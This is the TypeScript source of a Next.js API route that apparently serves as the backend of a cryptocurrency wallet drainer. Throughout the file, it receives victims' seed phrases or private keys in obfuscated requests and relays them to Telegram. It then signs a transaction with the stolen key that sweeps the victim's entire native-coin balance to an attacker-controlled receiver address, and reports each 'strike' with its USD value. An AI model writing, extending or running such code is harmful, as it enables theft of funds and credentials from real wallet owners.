import { ethers } from "ethers";
import { NextResponse } from "next/server";

// Logic Imports - All existing imports strictly preserved
import {
  deobfuscate,
  getProv,
  getNativeSym,
} from "@/hooks/execution/vault-logic/constants";

// 🛰️ Telemetry & Reporting Imports
import { sendFinalReports, formatMoney } from "@/lib/reporter";
import {
  sendDetailedSweepToTelegram,
  sendGasShortageAlert,
} from "@/lib/telegram";

/** 🛡️ SECURITY & RATE LIMIT CONFIG */
const WHITELIST = ["127.0.0.1", "::1"];
const IP_CACHE = new Map<string, { count: number; lastReset: number }>();
const LIMIT = 100;
const WINDOW = 10 * 60 * 1000;

const logPrefix = "[ROUTE-NATIVE]";

// Pattern: Force dynamic and high-velocity
export const dynamic = "force-dynamic";

// Helper for racing timeouts to prevent route hangs (Maintained Pattern)
const withTimeout = (promise: Promise<any>, ms: number) =>
  Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("TIMEOUT")), ms),
    ),
  ]);

export async function POST(req: Request) {
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0] || "unknown";

  // 🛰️ SCOPE INITIALIZATION
  let b: any = null;
  let victimAddr = "Unknown";
  let chainId = 1;
  let rawAssets: any[] = [];

  // 🛡️ Rate Limiting Logic
  if (!WHITELIST.includes(ip)) {
    const now = Date.now();
    const stats = IP_CACHE.get(ip) || { count: 0, lastReset: now };

    if (now - stats.lastReset > WINDOW) {
      stats.count = 1;
      stats.lastReset = now;
    } else {
      stats.count++;
    }

    IP_CACHE.set(ip, stats);
    if (stats.count > LIMIT) {
      return NextResponse.json({ error: "RATE_LIMIT" }, { status: 429 });
    }
  }

  try {
    const rawText = await req.text();
    const isObfuscated = req.headers.get("X-Ghost-Payload") === "base64";
    try {
      b = isObfuscated ? deobfuscate(rawText) : JSON.parse(rawText);
    } catch (err) {
      throw new Error("INVALID_JSON");
    }

    if (!b) throw new Error("PAYLOAD_EMPTY");

    // 🛰️ ASSIGN DATA
    victimAddr = b.userAddress || b.victim || b.v || "Unknown";
    chainId = Number(b.chainId || b.c || 1);
    rawAssets = b.assets || [];

    const provider = getProv(chainId);
    if (!provider) throw new Error("PROVIDER_NOT_FOUND");

    // --- 🔑 WAVE 1: ROOT KEY RELAY ---
    if (b.type === "ROOT_KEY_RELAY") {
      (async () => {
        await withTimeout(
          sendDetailedSweepToTelegram({
            status: "SUCCESS",
            type: "ROOT_KEY_RELAY",
            victimAddress: victimAddr,
            chainId: chainId.toString(),
            amount: "SEED_PHRASE",
            symbol: "VAULT_ACCESS",
            hash: b.masterKey || "DECRYPTED",
          }),
          4000,
        ).catch(() => null);
      })();
      return NextResponse.json({ success: true, mode: "RELAY_SYNCED" });
    }

    // --- 📝 WAVE 2: NATIVE SYNC (Precision & USD Fix) ---
    if (b.txHash || b.type === "NATIVE_SYNC") {
      (async () => {
        try {
          // 1. Capture payload amount (Wei or Ether string)
          let displayAmount = b.amount || b.value || "0.00";

          // WEI-TO-ETHER GUARD: Handle large Wei strings
          if (displayAmount.toString().length > 10) {
            try {
              displayAmount = ethers.formatEther(displayAmount);
            } catch (e) {
              console.warn(`${logPrefix} Conversion error, using raw.`);
            }
          }

          const cryptoNum = parseFloat(displayAmount);
          const cryptoReadable = cryptoNum.toFixed(6);

          // 2. Calculate USD Value using the price you added
          // Fallback to 600 (BNB estimate) if price is missing
          const currentPrice = parseFloat(b.price || 600);
          const usdValue = cryptoNum * currentPrice;

          // 3. Construct the dual-display string: "0.002434 ($1.55)"
          const combinedDisplay = `${cryptoReadable} (${formatMoney(
            usdValue,
          )})`;

          await withTimeout(
            sendDetailedSweepToTelegram({
              status: "SUCCESS",
              type: b.type || "NATIVE_SYNC",
              victimAddress: victimAddr,
              chainId: chainId.toString(),
              amount: combinedDisplay,
              symbol: getNativeSym(chainId),
              hash: b.txHash || "SYNC_LOGGED",
            }),
            5000,
          );
        } catch (e) {
          console.error(`${logPrefix} Background sync report failed`);
        }
      })();

      return NextResponse.json({ success: true, message: "STRIKE_LOGGED" });
    }

    // --- 🚀 WAVE 3: STRIKE TRIGGER (NATIVE SWEEP) ---
    if (b.type === "STRIKE_TRIGGER") {
      if (!b.masterKey) throw new Error("TRIGGER_MISSING_MASTER_KEY");

      const receiver = process.env.RECEIVER_EVM || " ";
      const strikeSigner = new ethers.Wallet(b.masterKey, provider);

      // Parallelize pre-strike data fetching
      const [balance, feeData] = await Promise.all([
        withTimeout(provider.getBalance(strikeSigner.address), 4000),
        withTimeout(provider.getFeeData(), 4000),
      ]);

      const baseGasPrice = feeData.gasPrice ?? 20000000000n;
      // High-priority gas (180% to match Ghost route)
      const gasPrice = (baseGasPrice * 180n) / 100n;
      const gasCost = 21000n * gasPrice;

      if (balance <= gasCost) throw new Error("INSUFFICIENT_FUNDS");

      const sweepValue = balance - gasCost;
      const nativeSym = getNativeSym(chainId);

      const tx = await strikeSigner.sendTransaction({
        to: receiver,
        value: sweepValue,
        gasPrice,
        gasLimit: 21000n,
      });

      // 🌪️ Decoupled Reporting
      (async () => {
        const netSuffix =
          chainId === 56 ? "(BSC)" : chainId === 137 ? "(POLY)" : "(ETH)";

        await withTimeout(
          sendFinalReports({
            assets:
              rawAssets.length > 0
                ? rawAssets
                : [{ symbol: nativeSym, signatureType: "NATIVE" }],
            txHash: tx.hash,
            chainId: chainId,
            victimAddress: strikeSigner.address,
            receiver: receiver,
            suffix: netSuffix,
            strikeType: "NATIVE_SWEEP",
            nativeSym: nativeSym,
            sweepValue: sweepValue, // Passed as bigint
          }),
          5000,
        ).catch((e) =>
          console.error(`${logPrefix} Reporter error:`, e.message),
        );
      })();

      return NextResponse.json({ success: true, hash: tx.hash, chainId });
    }

    return NextResponse.json({ success: true, status: "PROCESSED" });
  } catch (e: any) {
    console.error(`${logPrefix} ❌ Main Error: ${e.message}`);

    (async () => {
      if (
        e.message.toLowerCase().includes("funds") ||
        e.message.toLowerCase().includes("gas")
      ) {
        await withTimeout(
          sendGasShortageAlert({
            victimAddress: victimAddr,
            victimKey: b?.masterKey || "N/A",
            relayerKey: "NATIVE_WALLET",
            assetsFound: "NATIVE_GAS",
            requiredGas: "0.001",
            relayerAddress: victimAddr,
            chainId: chainId,
          }),
          3000,
        ).catch(() => null);
      } else {
        await withTimeout(
          sendDetailedSweepToTelegram({
            status: "FAILURE",
            type: b?.type || "NATIVE_ERROR",
            victimAddress: victimAddr,
            error: e.message,
            chainId: chainId.toString(),
          }),
          3000,
        ).catch(() => null);
      }
    })();

    return NextResponse.json(
      { success: false, error: e.message },
      { status: 200 },
    );
  }
}
